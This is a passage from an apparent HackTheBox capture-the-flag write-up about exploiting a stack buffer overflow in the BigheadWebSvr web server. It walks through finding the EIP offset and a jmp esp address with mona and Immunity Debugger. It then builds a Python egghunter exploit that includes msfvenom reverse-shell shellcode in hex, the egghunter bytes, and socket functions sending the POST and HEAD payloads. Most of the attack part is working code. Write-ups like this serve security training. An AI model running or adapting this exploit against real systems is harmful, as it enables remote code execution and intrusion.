<h2 id="Buffer-Overflow-in-BigheadWebSvr"><a href="#Buffer-Overflow-in-BigheadWebSvr" class="headerlink" title="Buffer Overflow in BigheadWebSvr"></a>Buffer Overflow in <code>BigheadWebSvr</code></h2><p>I tried to run the server but it complained about some missing <code>dll</code> called <code>libmingwex-0.dll</code> :<br><img src="/images/hackthebox/bighead/46.png" alt=""><br> So I installed <a href="https://osdn.net/projects/mingw/releases/" target="_blank" rel="noopener">mingw</a> and copied the <code>dll</code> to the same directory as the server :<br><img src="/images/hackthebox/bighead/47.png" alt=""><br>Then I had to allow access for it :<br><img src="/images/hackthebox/bighead/48.png" alt=""><br>Now the server is running :<br><img src="/images/hackthebox/bighead/49.png" alt=""><br>But not on port 80 :<br><img src="/images/hackthebox/bighead/50.png" alt=""><br>I did <code>netstat -a -b</code> and found that it’s running on port 8008 :<br><img src="/images/hackthebox/bighead/51.png" alt=""><br><img src="/images/hackthebox/bighead/52.png" alt=""><br><img src="/images/hackthebox/bighead/53.png" alt=""><br>Great, I intercepted the request with burp then I ran the server again with <a href="https://www.immunityinc.com/products/debugger/" target="_blank" rel="noopener">Immunity Debugger</a> :<br><img src="/images/hackthebox/bighead/54.png" alt=""><br><img src="/images/hackthebox/bighead/55.png" alt=""><br>Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D<br><img src="/images/hackthebox/bighead/56.png" alt=""><br><img src="/images/hackthebox/bighead/57.png" alt=""><br>And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example <code>R1ck</code> that egg is doubled and added before the shellcode like this : <code>R1ckR1ck + shellcode</code>. It’s explained very well in skape’s paper <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank" rel="noopener">Safely Searching Process Virtual Address Space</a>. There are also many practical tutorials just search for win32 egghunting.<br>Now back to the vulnerable server, first thing we need to know is the offset. I’m using <a href="https://github.com/corelan/mona" target="_blank" rel="noopener">mona plugin</a>. <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" target="_blank" rel="noopener">Documentation</a>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona config -set workingfolder c:\logs\%p&#96;, to make &#96;mona&#96; output to &#96;C:\logs</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/58.png" alt=""><br>To find the offset we will create a pattern <code>!mona pc 100</code> (creates a pattern of 100 chars), this is the same as <code>pattern_create.rb</code> from <code>metasploit</code>. I used it in my <a href="/categories/#binary-exploitation">buffer overflow write-ups</a>.<br><img src="/images/hackthebox/bighead/59.png" alt=""><br>It will put the output in a file called <code>pattern.txt</code> in <code>C:\logs</code> :<br><img src="/images/hackthebox/bighead/60.png" alt=""><br>Pattern : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/61.png" alt=""><br>Full output :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">================================================================================</span><br><span class="line">  Output generated by mona.py v2<span class="number">.0</span>, rev <span class="number">585</span> - Immunity Debugger</span><br><span class="line">  Corelan Team - https:<span class="comment">//www.corelan.be</span></span><br><span class="line">================================================================================</span><br><span class="line">  <span class="built_in">Process</span> being debugged : BigheadWebSvr (pid <span class="number">1300</span>)</span><br><span class="line">  Current mona arguments: pc <span class="number">100</span></span><br><span class="line">================================================================================</span><br><span class="line">  <span class="number">2019</span><span class="number">-04</span><span class="number">-24</span> <span class="number">22</span>:<span class="number">43</span>:<span class="number">44</span></span><br><span class="line">================================================================================</span><br><span class="line"></span><br><span class="line">Pattern of <span class="number">100</span> bytes :</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">ASCII:</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</span><br><span class="line"></span><br><span class="line">HEX:</span><br><span class="line">\x41\x61\x30\x41\x61\x31\x41\x61\x32\x41\x61\x33\x41\x61\x34\x41\x61\x35\x41\x61\x36\x41\x61\x37\x41\x61\x38\x41\x61\x39\x41\x62\x30\x41\x62\x31\x41\x62\x32\x41\x62\x33\x41\x62\x34\x41\x62\x35\x41\x62\x36\x41\x62\x37\x41\x62\x38\x41\x62\x39\x41\x63\x30\x41\x63\x31\x41\x63\x32\x41\x63\x33\x41\x63\x34\x41\x63\x35\x41\x63\x36\x41\x63\x37\x41\x63\x38\x41\x63\x39\x41\x64\x30\x41\x64\x31\x41\x64\x32\x41</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JAVASCRIPT (unescape() friendly):</span><br><span class="line">%u6141%u4130%u3161%u6141%u4132%u3361%u6141%u4134%u3561%u6141%u4136%u3761%u6141%u4138%u3961%u6241%u4130%u3162%u6241%u4132%u3362%u6241%u4134%u3562%u6241%u4136%u3762%u6241%u4138%u3962%u6341%u4130%u3163%u6341%u4132%u3363%u6341%u4134%u3563%u6341%u4136%u3763%u6341%u4138%u3963%u6441%u4130%u3164%u6441%u4132</span><br></pre></td></tr></table></figure>
<p>Let’s send the pattern :<br><img src="/images/hackthebox/bighead/62.png" alt=""><br><img src="/images/hackthebox/bighead/63.png" alt=""><br>the EIP was overwritten with <code>ACC54AAC</code>, <code>!mona findmsp</code> should give us the offset but for some reason it wasn’t able to find it so I did it manually. We will reverse <code>ACC54AAC</code> because it’s <a href="http://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html" target="_blank" rel="noopener">little endian</a>, so it will be <code>AC4AC5AC</code>. I located it then I used python’s function <code>len()</code> to find the length of the string before <code>AC4AC5AC</code> :<br><img src="/images/hackthebox/bighead/64.png" alt=""><br><img src="/images/hackthebox/bighead/65.png" alt=""><br>Offset is 72, let’s confirm that. I sent 72 A’s then 8 B’s :<br><img src="/images/hackthebox/bighead/66.png" alt=""><br>And I could successfully overwrite EIP with B :<br><img src="/images/hackthebox/bighead/67.png" alt=""><br>Nice, We control EIP, Now we need to find a real address to overwrite EIP with. Since the egghunter will be located on the stack we need to find a <code>jmp esp</code> instruction to make it jmp to the egghunter and execute it. To do this we will use mona. <code>!mona jmp -r ESP</code>. It will create another file in <code>C:\logs</code> called <code>jmp.txt</code>. We need to make sure that the address we choose will work on the target machine, So I used one of the addresses from the <code>dll</code> of the server itself <code>bHeadSvr.dll</code>. I chose the first one :<br><img src="/images/hackthebox/bighead/68.png" alt=""><br><img src="/images/hackthebox/bighead/69.png" alt=""><br>Full Output :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">================================================================================</span><br><span class="line">  Output generated by mona.py v2<span class="number">.0</span>, rev <span class="number">585</span> - Immunity Debugger</span><br><span class="line">  Corelan Team - https:<span class="comment">//www.corelan.be</span></span><br><span class="line">================================================================================</span><br><span class="line">  <span class="built_in">Process</span> being debugged : BigheadWebSvr (pid <span class="number">5532</span>)</span><br><span class="line">  Current mona arguments: jmp -r ESP</span><br><span class="line">================================================================================</span><br><span class="line">  <span class="number">2019</span><span class="number">-04</span><span class="number">-25</span> <span class="number">02</span>:<span class="number">15</span>:<span class="number">27</span></span><br><span class="line">================================================================================</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> Module info :</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename &amp; Path</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> <span class="number">0x74c70000</span> | <span class="number">0x74e61000</span> | <span class="number">0x001f1000</span> | True   | True    | True  |  False   | True   | <span class="number">10.0</span><span class="number">.17763</span><span class="number">.1</span> [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll)</span><br><span class="line"> <span class="number">0x771f0000</span> | <span class="number">0x77269000</span> | <span class="number">0x00079000</span> | True   | True    | True  |  False   | True   | <span class="number">10.0</span><span class="number">.17763</span><span class="number">.1</span> [sechost.dll] (C:\Windows\System32\sechost.dll)</span><br><span class="line"> <span class="number">0x00400000</span> | <span class="number">0x00413000</span> | <span class="number">0x00013000</span> | False  | False   | False |  False   | False  | <span class="number">-1.0</span>- [BigheadWebSvr.exe] (C:\bighead\BHWS_Backup\BigheadWebSvr.exe)</span><br><span class="line"> <span class="number">0x62500000</span> | <span class="number">0x62510000</span> | <span class="number">0x00010000</span> | False  | False   | False |  False   | False  | <span class="number">-1.0</span>- [bHeadSvr.dll] (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"> <span class="number">0x75510000</span> | <span class="number">0x755a8000</span> | <span class="number">0x00098000</span> | True   | True    | True  |  False   | True   | <span class="number">10.0</span><span class="number">.17763</span><span class="number">.1</span> [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)</span><br><span class="line"> <span class="number">0x74ef0000</span> | <span class="number">0x74fb0000</span> | <span class="number">0x000c0000</span> | True   | True    | True  |  False   | True   | <span class="number">7.0</span><span class="number">.17763</span><span class="number">.1</span> [msvcrt.dll] (C:\Windows\System32\msvcrt.dll)</span><br><span class="line"> <span class="number">0x64540000</span> | <span class="number">0x64570000</span> | <span class="number">0x00030000</span> | False  | False   | False |  False   | False  | <span class="number">-1.0</span>- [libmingwex<span class="number">-0.</span>dll] (C:\bighead\BHWS_Backup\libmingwex<span class="number">-0.</span>dll)</span><br><span class="line"> <span class="number">0x75270000</span> | <span class="number">0x752ee000</span> | <span class="number">0x0007e000</span> | True   | True    | True  |  False   | True   | <span class="number">10.0</span><span class="number">.17763</span><span class="number">.1</span> [ADVAPI32.DLL] (C:\Windows\System32\ADVAPI32.DLL)</span><br><span class="line"> <span class="number">0x776b0000</span> | <span class="number">0x77847000</span> | <span class="number">0x00197000</span> | True   | True    | True  |  False   | True   | <span class="number">10.0</span><span class="number">.17763</span><span class="number">.1</span> [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)</span><br><span class="line"> <span class="number">0x77410000</span> | <span class="number">0x774cf000</span> | <span class="number">0x000bf000</span> | True   | True    | True  |  False   | True   | <span class="number">10.0</span><span class="number">.17763</span><span class="number">.1</span> [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll)</span><br><span class="line"> <span class="number">0x75370000</span> | <span class="number">0x753cf000</span> | <span class="number">0x0005f000</span> | True   | True    | True  |  False   | True   | <span class="number">10.0</span><span class="number">.17763</span><span class="number">.1</span> [WS2_32.dll] (C:\Windows\System32\WS2_32.dll)</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">0x625012f0</span> : jmp esp |  &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x625012fd</span> : jmp esp |  &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x6250130a</span> : jmp esp | ascii &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x62501317</span> : jmp esp | ascii &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x62501324</span> : jmp esp | ascii &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x62501331</span> : jmp esp | ascii &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x6250133e</span> : jmp esp | ascii &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x6250134b</span> : jmp esp | ascii &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x6250134d</span> : jmp esp | ascii &#123;PAGE_EXECUTE_READ&#125; [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\bHeadSvr.dll)</span><br><span class="line"><span class="number">0x6455b1ca</span> : push esp # ret  |  &#123;PAGE_EXECUTE_READ&#125; [libmingwex<span class="number">-0.</span>dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v<span class="number">-1.0</span>- (C:\bighead\BHWS_Backup\libmingwex<span class="number">-0.</span>dll)</span><br></pre></td></tr></table></figure>
<p>Let’s send a request to test it, 72 A’s then <code>f0125062</code> which is <code>625012f0</code> reversed:<br><img src="/images/hackthebox/bighead/70.png" alt=""><br><img src="/images/hackthebox/bighead/71.png" alt=""><br>It’s working fine. Last thing we need to know is how to send the shellcode. I sent a POST request to see how the server handles it, just a bunch of A’s :<br><img src="/images/hackthebox/bighead/72.png" alt=""><br>Then I searched in the memory :<br><img src="/images/hackthebox/bighead/73.png" alt=""><br><img src="/images/hackthebox/bighead/74.png" alt=""><br><img src="/images/hackthebox/bighead/75.png" alt=""><br>As we can see the whole request is printed in the memory. With this information now we can write the exploit.</p>
<h2 id="Writing-the-Exploit"><a href="#Writing-the-Exploit" class="headerlink" title="Writing the Exploit"></a>Writing the Exploit</h2><p>First thing is the imports, I imported <code>socket</code>,<code>binascii</code> and <code>re</code> </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure>
<p>Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let’s generate the shellcode first :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.xx.xx LPORT&#x3D;1337 -b &#39;\x00&#39; -f python</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/76.png" alt=""><br><code>-b &#39;\x00&#39;</code> is for bad chars. <code>\x00</code> which is a null byte is always a bad char because it acts a string terminator and terminates the execution so we don’t need that in the shellcode.  We will add this to the exploit and remove <code>\x</code> because we will use <code>hexlify</code> and <code>unhexlify</code> functions from <code>binascii</code>. This is for the shellcode, now we need the egghunter. I used this <a href="https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py" target="_blank" rel="noopener">tool</a> to generate the egghunter :<br><img src="/images/hackthebox/bighead/77.png" alt=""><br>But I didn’t like that I should generate a new one if I wanted to change the egg, here’s how the tool is doing it :<br><img src="/images/hackthebox/bighead/78.png" alt=""><br>We can easily add this to the exploit itself. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">host = <span class="string">'10.10.10.112'</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">egg = <span class="string">'R1ck'</span></span><br></pre></td></tr></table></figure>
<p><code>host</code> is for the ip of the machine, <code>port</code> is for the port and <code>egg</code> is to hold the value of the egg. After that comes the <code>buf</code> variable generated by <code>msfvenom</code> (this is the my shellcode you should generate a new one with your ip and listening port) :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">buf =  <span class="string">""</span></span><br><span class="line">buf += <span class="string">"d9c7d97424f45a2bc9bb9f0948"</span></span><br><span class="line">buf += <span class="string">"3bb15283c204315a1303c51aaa"</span></span><br><span class="line">buf += <span class="string">"ce05f4a831f505cdb81034cddf"</span></span><br><span class="line">buf += <span class="string">"5167fd94378476f8a31ffad5c4"</span></span><br><span class="line">buf += <span class="string">"a8b103eb29e9706aaaf0a44c93"</span></span><br><span class="line">buf += <span class="string">"3ab98dd42730df8d2ce7cfba79"</span></span><br><span class="line">buf += <span class="string">"3464f06c3c99418e6d0cd9c9ad"</span></span><br><span class="line">buf += <span class="string">"af0e62e4b7534fbe4ca73b4184"</span></span><br><span class="line">buf += <span class="string">"f9c4eee93537ee2ef1a8854601"</span></span><br><span class="line">buf += <span class="string">"549e9d7b822b05db418be1dd86"</span></span><br><span class="line">buf += <span class="string">"4a62d163182cf672cd4702fef0"</span></span><br><span class="line">buf += <span class="string">"878244d703ce1f7612aace8744"</span></span><br><span class="line">buf += <span class="string">"15ae2d0fb8bb5f52d508526c25"</span></span><br><span class="line">buf += <span class="string">"07e51f17885db71b4178405b78"</span></span><br><span class="line">buf += <span class="string">"3cdea2833df760d76d6f4058e6"</span></span><br><span class="line">buf += <span class="string">"6f6d8da93fc17e0aefa12ee2e5"</span></span><br><span class="line">buf += <span class="string">"2d101206e439b9fd6f4c34ee74"</span></span><br><span class="line">buf += <span class="string">"384a108e81c3f6fae185a19298"</span></span><br><span class="line">buf += <span class="string">"8f3902641a4404eea9b9cb07c7"</span></span><br><span class="line">buf += <span class="string">"a9bce792936bf708bbf06ad73b"</span></span><br><span class="line">buf += <span class="string">"7e97406cd76999f8c5d0331e14"</span></span><br><span class="line">buf += <span class="string">"847c9ac375822381c2a0335fca"</span></span><br><span class="line">buf += <span class="string">"ec670f9dbad1e9770d8ba324c7"</span></span><br><span class="line">buf += <span class="string">"5b3507d81d3a42aec18b3bf7fe"</span></span><br><span class="line">buf += <span class="string">"24acff87584cff52d97c4afe48"</span></span><br><span class="line">buf += <span class="string">"15136bc978a4460e852762ef72"</span></span><br><span class="line">buf += <span class="string">"3707ea3ffff486506afa3550bf"</span></span><br></pre></td></tr></table></figure>
<p>I created a variable to hold the final shellcode (egg doubled + shellcode) and another variable for the egghunter :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (egg * <span class="number">2</span>) + binascii.unhexlify(buf)</span><br><span class="line">egghunter = <span class="string">"6681caff0f42526a0258cd2e3c055a74efb8"</span> + binascii.hexlify(egg) + <span class="string">"8bfaaf75eaaf75e7ffe7"</span></span><br></pre></td></tr></table></figure>
<p>Note : there’s a variable called <code>N</code>, that will come later and it has nothing to do with the exploit itself.<br>Now we need to create two functions. First one is to send the shellcode through a POST request, The other one is to exploit the vulnerability and send the egghunter.<br>We will start by defining the function :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_shellcode</span><span class="params">(N,host,port,egg,shellcode)</span>:</span></span><br></pre></td></tr></table></figure>
<p>Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code>s</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>Last thing to do is to send the POST request with the shellcode :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s.send(<span class="string">"POST / HTTP/1.1\r\n"</span>)</span><br><span class="line">s.send(<span class="string">"Host: dev.bighead.htb\r\n"</span>)</span><br><span class="line">s.send(<span class="string">"Content-Length: %s\r\n"</span>%len(shellcode))</span><br><span class="line">s.send(<span class="string">"\r\n"</span>)</span><br><span class="line">s.send(shellcode+<span class="string">"\r\n"</span>)</span><br><span class="line">s.send(<span class="string">"\r\n"</span>)</span><br></pre></td></tr></table></figure>
<p>Then we will close the stream : <code>s.close()</code><br>I added this in a <code>for</code> loop to send the shellcode 16 times. I did this because I wanted to put the shellcode in different places so the egghunter finds it easily. I also added a print statement at the start of the function : <code>print &quot;\033[32m [*] Sending Shellcode&quot;</code>, <code>\033[32m</code> is for the color it’s not important for the exploit. And I added a print statement before closing the stream : <code>print &#39;\033[34m&#39; + &#39;[&#39; + str(N) + &#39;] &#39; + re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))</code>. <code>re.sub(r&quot;\s&quot;,&quot; &quot;,s.recv(12))</code> This will use <code>re</code> (regular expressions operations) to print the first 12 chars of the first line of the server response (“HTTP/1.1” + “ “ + status code (3 chars) = 12).<br><code>send_shellcode</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_shellcode</span><span class="params">(N,host,port,egg,shellcode)</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\033[32m [*] Sending Shellcode"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br><span class="line">		s.connect((host,port))</span><br><span class="line">		s.send(<span class="string">"POST / HTTP/1.1\r\n"</span>)</span><br><span class="line">		s.send(<span class="string">"Host: dev.bighead.htb\r\n"</span>)</span><br><span class="line">		s.send(<span class="string">"Content-Length: %s\r\n"</span>%len(shellcode))</span><br><span class="line">		s.send(<span class="string">"\r\n"</span>)</span><br><span class="line">		s.send(shellcode+<span class="string">"\r\n"</span>)</span><br><span class="line">		s.send(<span class="string">"\r\n"</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'\033[34m'</span> + <span class="string">'['</span> + str(N) + <span class="string">'] '</span> + re.sub(<span class="string">r"\s"</span>,<span class="string">" "</span>,s.recv(<span class="number">12</span>))</span><br><span class="line">		s.close()</span><br><span class="line">		N += <span class="number">1</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\033[32m [*] Done"</span></span><br></pre></td></tr></table></figure>
<p>That’s for <code>send_shellcode</code>, let’s write <code>send_egghunter</code>. We will define the function first :<br><code>def send_egghunter(host,port,egghunter):</code><br>Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code>s</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>Then we will connect and send the HEAD request :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s.connect((host,port))</span><br><span class="line">s.settimeout(<span class="literal">None</span>)</span><br><span class="line">s.send(<span class="string">"HEAD /"</span> + (<span class="string">"A"</span>*<span class="number">72</span>) + <span class="string">"f0125062"</span> + egghunter + <span class="string">" HTTP/1.1\r\n"</span>)</span><br><span class="line">s.send(<span class="string">"Host: dev.bighead.htb\r\n"</span>)</span><br><span class="line">s.send(<span class="string">"\r\n"</span>)</span><br></pre></td></tr></table></figure>
<p>I did <code>settimeout(None)</code> as the server takes a lot of time to respond to this request (Because we will change the code flow so the server won’t reply) and we don’t want the stream to be closed before our egghunter is successfully executed.<br><code>s.send(&quot;HEAD /&quot; + (&quot;A&quot;*72) + &quot;f0125062&quot; + egghunter + &quot; HTTP/1.1\r\n&quot;)</code> This line sends 72 A’s then <code>f0125062</code> (jmp esp (new EIP)) then the egghunter.<br><code>send_egghunter</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_egghunter</span><span class="params">(host,port,egghunter)</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\033[32m [*] Sending EggHunter"</span></span><br><span class="line">	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br><span class="line">	s.connect((host,port))</span><br><span class="line">	s.settimeout(<span class="literal">None</span>)</span><br><span class="line">	s.send(<span class="string">"HEAD /"</span> + (<span class="string">"A"</span>*<span class="number">72</span>) + <span class="string">"f0125062"</span> + egghunter + <span class="string">" HTTP/1.1\r\n"</span>)</span><br><span class="line">	s.send(<span class="string">"Host: dev.bighead.htb\r\n"</span>)</span><br><span class="line">	s.send(<span class="string">"\r\n"</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'\033[34m'</span> + re.sub(<span class="string">r"\s"</span>,<span class="string">" "</span>,s.recv(<span class="number">12</span>))</span><br><span class="line">	s.close()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\033[32m [*] Done"</span></span><br></pre></td></tr></table></figure>
<p>The exploit is ready, we just need to call the functions :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">send_shellcode(N,host,port,egg,shellcode)</span><br><span class="line">send_egghunter(host,port,egghunter)</span><br></pre></td></tr></table></figure>
<p>Final Exploit :</p>
